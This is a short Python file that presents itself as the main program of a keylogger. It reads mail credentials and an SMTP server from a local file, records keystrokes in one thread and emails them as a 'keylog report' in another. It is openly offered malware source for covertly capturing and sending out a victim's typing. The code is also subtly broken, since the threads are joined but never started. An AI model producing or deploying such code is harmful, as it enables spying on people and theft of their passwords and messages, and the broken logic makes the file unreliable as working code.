"""
Main program of the keylogger
author : @Crun
"""

#importement
import maile
import keygetting
import threading                     #for multiprocessing
import time                          #for intervals



#getting the variables
with open("informations.txt") as file :        #reading the data from the info file
	lines = file.readlines()

	adress = lines[0]
	password = lines[1]
	smtp_host = lines[2]
	smtp_port = int(lines[3])
	interval = int(lines[4])



#functions (mainly for threads)
def mail_side() : 
	time.sleep(interval)                          #to have the mail sent whenever the interval is done
	maile.send_mail(keygetting.keys, adress, password, smtp_host, smtp_port, "keylog report")            #sending the mail
	print("mail sent")

def key_side() : 
	keygetting.listen()                        #taking the keys



#threads
mail_thread = threading.Thread(target = mail_side)
key_thread = threading.Thread(target = key_side)           #creating the threads


key_thread.join()
mail_thread.join()                                           #starting the threads
